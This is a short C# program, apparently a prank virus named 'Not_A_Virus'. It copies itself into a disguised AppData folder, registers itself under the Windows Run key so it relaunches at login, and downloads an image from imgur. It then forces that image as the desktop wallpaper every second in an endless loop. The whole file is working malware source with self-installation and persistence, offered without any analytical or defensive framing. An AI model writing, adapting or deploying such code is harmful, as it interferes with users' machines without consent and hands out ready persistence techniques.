using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net;
using Microsoft.Win32;

namespace Not_A_Virus
{
    class Program
    {
        static void Main(string[] args)
        {
            string path = System.Reflection.Assembly.GetEntryAssembly().Location;
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            string savePath = "C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\Safety\\Not_A_Virus.exe";
            if (path != savePath)
            {
                System.IO.File.Copy(path, savePath, true);
                System.Diagnostics.Process.Start(savePath);
            }
            else
            {
                string Photopath = path.Replace("\\", "/").Replace("Not_A_Virus.exe", "") + "suriV.jpg";
                RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                reg.SetValue("Not_A_Virus", path);
                using (var client = new WebClient())
                {
                    client.DownloadFile("https://i.imgur.com/JLByEQk.jpg", Photopath);
                }

                while (true)
                {
                    SetWallpaper(Photopath);
                    Thread.Sleep(1000); // Change to 100 for full effect
                }
            }

        }
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
        UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        static void SetWallpaper(String path)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
    }
}
